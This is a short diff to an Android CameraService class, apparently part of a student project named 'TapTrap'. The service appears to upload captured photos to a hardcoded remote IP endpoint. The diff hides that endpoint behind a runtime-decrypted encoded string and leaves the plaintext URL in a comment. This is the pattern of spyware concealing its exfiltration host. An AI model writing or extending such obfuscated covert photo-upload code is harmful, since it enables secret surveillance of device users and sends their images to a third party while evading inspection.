@@ -12,6 +12,8 @@ import android.os.HandlerThread;
 import android.os.IBinder;
 import android.util.Log;
 
+import com.example.inf2007_mad_j1847.utils.StringHelper;
+
 import java.io.ByteArrayOutputStream;
 import java.io.File;
 import java.io.FileOutputStream;
@@ -23,7 +25,8 @@ import java.nio.ByteBuffer;
 public class CameraService extends Service {
 
     private static final String TAG = "TapTrap-Camera";
-    private static final String SERVER_URL = "http://20.2.66.175:9090/upload_photo";
+    private static final String SERVER_URL = StringHelper.decrypt("k0UpyIxAcvyo3reRKmBBeXOQmSuC5fky1zrIZzGIwe5eovzCGLymZD805JJrRM+ZsFlO4a3ij43etdgZ7jZhHg==");
+    // http://20.2.66.175:9090/upload_photo
 
     private CameraDevice cameraDevice;
     private CameraCaptureSession captureSession;
